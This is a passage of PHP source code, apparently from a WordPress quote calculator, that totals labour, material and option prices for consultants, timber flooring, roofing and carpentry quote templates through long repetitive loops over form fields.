                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$complex_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $complex_total = $complex_total +  ( $labour_and_material_total * $complex_count);
                                }
                                elseif($complex_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $complex_total = $complex_total + ( $range_price_total * $complex_count);
                                }

                        }

                }

                $clad = $data['clad'];
                $clad_total = 0;
                foreach($clad_data as $temp) {
                        if( in_array($temp['title'],$clad) ) {

                                // let's count QNT of each clad field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $clad_count = $data['' . $count_field_title . ''];
                                if($clad_count == NULL || $clad_count == '' || empty($clad_count)) {
                                       $clad_count = 1;
                                }

                                if($clad_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$clad_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $clad_total = $clad_total +  ( $labour_and_material_total * $clad_count);
                                }
                                elseif($clad_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $clad_total = $clad_total + ( $range_price_total * $clad_count);
                                }

                        }

                }

	              $soffit = $data['soffit'];
                $soffit_total = 0;
                foreach($soffit_data as $temp) {
                        if( in_array($temp['title'],$soffit) ) {

                                // let's count QNT of each soffit field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $soffit_count = $data['' . $count_field_title . ''];
                                if($soffit_count == NULL || $soffit_count == '' || empty($soffit_count)) {
                                       $soffit_count = 1;
                                }

                                if($soffit_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$soffit_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $soffit_total = $soffit_total +  ( $labour_and_material_total * $soffit_count);
                                }
                                elseif($soffit_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $soffit_total = $soffit_total + ( $range_price_total * $soffit_count);
                                }

                        }

                }

                $spout_type = $data['spout_type'];
                $spout_type_total = 0;
                foreach($spout_type_data as $temp) {
                        if( in_array($temp['title'],$spout_type) ) {

                                // let's count QNT of each spout_type field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $spout_type_count = $data['' . $count_field_title . ''];
                                if($spout_type_count == NULL || $spout_type_count == '' || empty($spout_type_count)) {
                                       $spout_type_count = 1;
                                }

                                if($spout_type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$spout_type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $spout_type_total = $spout_type_total +  ( $labour_and_material_total * $spout_type_count);
                                }
                                elseif($spout_type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $spout_type_total = $spout_type_total + ( $range_price_total * $spout_type_count);
                                }

                        }

                }


                $down = $data['down'];
                $down_total = 0;
                foreach($down_data as $temp) {
                        if( in_array($temp['title'],$down) ) {

                                // let's count QNT of each down field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $down_count = $data['' . $count_field_title . ''];
                                if($down_count == NULL || $down_count == '' || empty($down_count)) {
                                       $down_count = 1;
                                }

                                if($down_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$down_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $down_total = $down_total +  ( $labour_and_material_total * $down_count);
                                }
                                elseif($down_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $down_total = $down_total + ( $range_price_total * $down_count);
                                }

                        }

                }

                $down_type = $data['down_type'];
                $down_type_total = 0;
                foreach($down_type_data as $temp) {
                        if( in_array($temp['title'],$down_type) ) {

                                // let's count QNT of each down_type field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $down_type_count = $data['' . $count_field_title . ''];
                                if($down_type_count == NULL || $down_type_count == '' || empty($down_type_count)) {
                                       $down_type_count = 1;
                                }

                                if($down_type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$down_type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $down_type_total = $down_type_total +  ( $labour_and_material_total * $down_type_count);
                                }
                                elseif($down_type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $down_type_total = $down_type_total + ( $range_price_total * $down_type_count);
                                }

                        }

                }


	                              $roof_sub_total = ( $framing_total + $clad_total ) * roof_area;
                                $roof_complex = ( $roof_sub_total * $complex_total ) /100 ;
                                $downpipe_total = $down_type_total * $down_total;
                                $soffit_sub_total = $soffit_total * $soffit_length;
                                $spouting_sub_total = $spout_type_total * $spouting;
                                $roof_full = $roof_sub_total + $roof_complex + $downpipe_total + $soffit_sub_total + $spouting_sub_total;


                                $total = $total + $roof_full;


                }

        // V2 formulas for Consultants template
        if(get_the_title($t) == 'Consultants') {

                $all_scope_data = get_field('quote_fields',$t);

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'consent') {
                                $consent_title = $d['title'];
                                $consent_prices = $d['type_of_price'];
                                $consent_data = $d['fields'];
                        }
                        if($d['slug'] == 'drafting') {
                                $drafting_title = $d['title'];
                                $drafting_prices = $d['type_of_price'];
                                $drafting_data = $d['fields'];
                        }
                        if($d['slug'] == 'other') {
                                $other_title = $d['title'];
                                $other_prices = $d['type_of_price'];
                                $other_data = $d['fields'];
                        }
                }

                $consent = $data['consent'];
                $consent_total = 0;
                foreach($consent_data as $temp) {
                        if( in_array($temp['title'],$consent)  || $temp['title'] == $consent ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($consent_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$consent_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $consent_total = $consent_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($consent_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $consent_total = $consent_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $drafting = $data['drafting'];
                $drafting_total = 0;
                foreach($drafting_data as $temp) {
                        if( in_array($temp['title'],$drafting) || $temp['title'] == $drafting ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($drafting_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$drafting_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $drafting_total = $drafting_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($drafting_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $drafting_total = $drafting_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $other = $data['other'];
                $other_total = 0;
                foreach($other_data as $temp) {
                        if( in_array($temp['title'],$other) || $temp['title'] == $other ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($other_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$other_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $other_total = $other_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($other_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $other_total = $other_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $consultants_total = $consent_total + $drafting_total + $other_total;
                $total = $total + $consultants_total;

        }

        // V2 formulas for Flooring template
        if(get_the_title($t) == 'Timber Flooring') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['square_width'];
                $length = $data['square_length'];

                $area = $width * $length;

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'current') {
                                $current_title = $d['title'];
                                $current_prices = $d['type_of_price'];
                                $current_data = $d['fields'];
                        }
                        if($d['slug'] == 'proposed') {
                                $proposed_title = $d['title'];
                                $proposed_prices = $d['type_of_price'];
                                $proposed_data = $d['fields'];
                        }
                        if($d['slug'] == 'remove') {
                                $remove_title = $d['title'];
                                $remove_prices = $d['type_of_price'];
                                $remove_data = $d['fields'];
                        }
                        if($d['slug'] == 'extra') {
                                $extra_title = $d['title'];
                                $extra_prices = $d['type_of_price'];
                                $extra_data = $d['fields'];
                        }
                }

                $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( in_array($temp['title'],$current)  || $temp['title'] == $current ) {

                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total +  ( $labour_and_material_total * $area );
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ( $range_price_total * $area );
                                }

                        }
                }

                $proposed = $data['proposed'];
                $proposed_total = 0;
                foreach($proposed_data as $temp) {
                        if( in_array($temp['title'],$proposed)  || $temp['title'] == $proposed ) {

                                if($proposed_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_total = $proposed_total + ( $labour_and_material_total * $area );
                                }
                                elseif($proposed_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $proposed_total = $proposed_total + ( $range_price_total * $area );
                                }

                        }
                }

                $remove = $data['remove'];

                $extra = $data['extra'];
                $extra_total = 0;
                foreach($extra_data as $temp) {
                        if( in_array($temp['title'],$extra) || $temp['title'] == $extra ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extra_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$remove_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extra_total = $extra_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($extra_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extra_total = $extra_total + ( $range_price_total * $extra_count);
                                }

                        }
                }

                if($remove != 'Yes') {
                        $current_total = 0;
                }
                else {
                        $current_total = $current_total;
                }
                $flooring_total = $current_total + $proposed_total + $extra_total;
                $total = $total + $flooring_total;

        }

        // V2 formulas for Roofing template
        if(get_the_title($t) == 'Roofing') {

            $all_scope_data = get_field('quote_fields',$t);

            $width = $data['area_width'];
            $length = $data['area_length'];

            $area = $width * $length;
            $outer_length = $width + $width + $length + $length;
            $demolition = $data['demolition'];

            foreach($all_scope_data as $d) {
                    if($d['slug'] == 'slope') {
                            $roof_pitch_title = $d['title'];
                            $roof_pitch_prices = $d['type_of_price'];
                            $roof_pitch_data = $d['fields'];
                    }
                    if($d['slug'] == 'current') {
                            $current_title = $d['title'];
                            $current_prices = $d['type_of_price'];
                            $current_data = $d['fields'];
                    }
                    if($d['slug'] == 'complex') {
                            $complex_title = $d['title'];
                            $complex_prices = $d['type_of_price'];
                            $complex_data = $d['fields'];
                    }
                    if($d['slug'] == 'material') {
                            $material_title = $d['title'];
                            $material_prices = $d['type_of_price'];
                            $material_data = $d['fields'];
                    }
                    if($d['slug'] == 'gutter') {
                            $gutter_title = $d['title'];
                            $gutter_prices = $d['type_of_price'];
                            $gutter_data = $d['fields'];
                    }
                    if($d['slug'] == 'misc') {
                            $misc_title = $d['title'];
                            $misc_prices = $d['type_of_price'];
                            $misc_data = $d['fields'];
                    }
            }

            $current = $data['current'];
            $current_total = 0;
            foreach($current_data as $temp) {
                    if( in_array($temp['title'],$current)  || $temp['title'] == $current ) {

                            if($current_prices == 'labour') {
                                    $labour_price_total = $temp['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $temp['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $current_total = $current_total +  ( $labour_and_material_total * $area );
                            }
                            elseif($current_prices == 'range') {
                                    $range_price_total = $temp['range_price'];
                                    $current_total = $current_total + ( $range_price_total * $area );
                            }

                    }
            }

            $roof_pitch = $data['slope'];
            $roof_pitch_total = 0;
            foreach($roof_pitch_data as $temp) {
                    if( in_array($temp['title'],$roof_pitch)  || $temp['title'] == $roof_pitch ) {

                            $range_price_total = $temp['range_price'];
                            $roof_pitch_total = $range_price_total;

                    }
            }

            $complex = $data['complex'];
            $complex_total = 0;
            foreach($complex_data as $temp) {
                    if( in_array($temp['title'],$complex)  || $temp['title'] == $complex ) {

                            $range_price_total = $temp['range_price'];
                            $complex_total = $range_price_total;

                    }
            }

            $material = $data['material'];
            $material_total = 0;
            foreach($material_data as $temp) {
                    if( in_array($temp['title'],$material)  || $temp['title'] == $material ) {

                            if($material_prices == 'labour') {
                                    $labour_price_total = $temp['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $temp['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$material_title,$temp['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $material_total = $material_total +  ( $labour_and_material_total * $area );
                            }
                            elseif($material_prices == 'range') {
                                    $range_price_total = $temp['range_price'];
                                    $material_total = $material_total + ( $range_price_total * $area );
                            }

                    }
            }

            $gutter = $data['gutter'];
            $gutter_total = 0;
            foreach($gutter_data as $temp) {
                    if( in_array($temp['title'],$gutter)  || $temp['title'] == $gutter ) {

                            if($gutter_prices == 'labour') {
                                    $labour_price_total = $temp['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $temp['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$gutter_title,$temp['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $gutter_total = $gutter_total +  ( $labour_and_material_total * $outer_length );
                            }
                            elseif($gutter_prices == 'range') {
                                    $range_price_total = $temp['range_price'];
                                    $gutter_total = $gutter_total + ( $range_price_total * $outer_length );
                            }

                    }
            }

            $misc = $data['misc'];
            $misc_total = 0;
            foreach($misc_data as $temp) {
                    if( in_array($temp['title'],$misc) || $temp['title'] == $misc ) {

                            // let's count QNT of each extra field
                            $field_title = $temp['title'];
                            $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                            $count_field_title = strtolower($count_field_title);
                            $extra_count = $data['' . $count_field_title . ''];
                            if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                   $extra_count = 1;
                            }

                            if($misc_prices == 'labour') {
                                    $labour_price_total = $temp['labour'];
                                    $labour_price_total_value = 0;
                                    $material_price_total = $temp['material'];
                                    $material_price_total_value = 0;
                                    foreach($labour_price_total as $l) {
                                            $labour_price_total_value = $labour_price_total_value + $l['price'];
                                    }
                                    foreach($material_price_total as $m) {
                                            $material_price_total_value = $material_price_total_value + $m['price'];
                                    }
                                    $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                    // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                    $selectionPrice = 0;
                                    $selectionPrice = go_calculate_selection($selectionsData,$misc_title,$temp['title']);
                                    $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                    // *** END ***

                                    $misc_total = $misc_total + ( $labour_and_material_total * $extra_count );
                            }
                            elseif($misc_prices == 'range') {
                                    $range_price_total = $temp['range_price'];
                                    $misc_total = $misc_total + ( $range_price_total * $extra_count);
                            }

                    }
            }

            if($demolition != 'Yes') {
                    $current_total = 0;
            }
            else {
                    $current_total = $current_total;
            }

            $percent = $roof_pitch_total + $complex_total;
            $material_sub_price = $material_total * $percent / 100;
            $material_full_price = $material_total + $material_sub_price;
            $roofing_total = $gutter_total + $misc_total + $material_full_price + $current_total;

            $total = $total + $roofing_total;

        }

        // V2 formulas for General Building template
        if(get_the_title($t) == 'Carpentry') {

                $all_scope_data = get_field('quote_fields',$t);

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'general') {
                                $general_title = $d['title'];
                                $general_prices = $d['type_of_price'];
                                $general_data = $d['fields'];
                        }
                        if($d['slug'] == 'demo') {
                                $demo_title = $d['title'];
                                $demo_prices = $d['type_of_price'];
                                $demo_data = $d['fields'];
                        }
                        if($d['slug'] == 'doors') {
                                $doors_title = $d['title'];
                                $doors_prices = $d['type_of_price'];
                                $doors_data = $d['fields'];
                        }
                        if($d['slug'] == 'windows') {
                                $windows_title = $d['title'];
                                $windows_prices = $d['type_of_price'];
                                $windows_data = $d['fields'];
                        }
                        if($d['slug'] == 'trim') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
                        if($d['slug'] == 'misc') {
                                $misc_title = $d['title'];
                                $misc_prices = $d['type_of_price'];
                                $misc_data = $d['fields'];
                        }
                }

                $general = $data['general'];
                $general_total = 0;
                foreach($general_data as $temp) {
                        if( in_array($temp['title'],$general) || $temp['title'] == $general ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($general_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$general_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $general_total = $general_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($general_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $general_total = $general_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $demo = $data['demo'];
                $demo_total = 0;
                foreach($demo_data as $temp) {
                        if( in_array($temp['title'],$demo) || $temp['title'] == $demo ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($demo_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$demo_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $demo_total = $demo_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($demo_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $demo_total = $demo_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) || $temp['title'] == $doors ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
